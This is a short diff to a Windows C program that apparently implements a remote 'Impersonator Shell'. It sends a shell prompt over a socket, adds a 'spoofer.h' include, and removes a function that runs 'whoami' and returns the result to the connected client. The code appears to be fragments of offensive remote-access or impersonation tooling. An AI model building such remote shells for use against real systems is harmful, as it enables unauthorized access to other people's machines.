@@ -1,8 +1,9 @@
 #include <winsock2.h>
 #include <Windows.h>
 #include <stdio.h>
-#include "doexec.h"
 #include <Lmcons.h>
+#include "doexec.h"
+#include "spoofer.h"
 
 /*
 * String IO Functions
@@ -38,19 +39,6 @@ int command_prompt(int sockfd){
     char *print_this = "\n[Impersonator Shell]>";
     send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
     
-    return 0;
-}
-
-int username(int sockfd){
-
-    /*print Impersonator*/
-    char *print_this = "\r\n\r\n[+] The Current User Is: ";
-    send(sockfd, print_this, sizeof(char) * strlen(print_this), 0);
-    
-    char *whoami = "whoami\r\n";
-    char *name = norm_exec(whoami);
-    send(sockfd, name, sizeof(char) * strlen(name), 0);
-    free(name);
     return 0;
 }
 
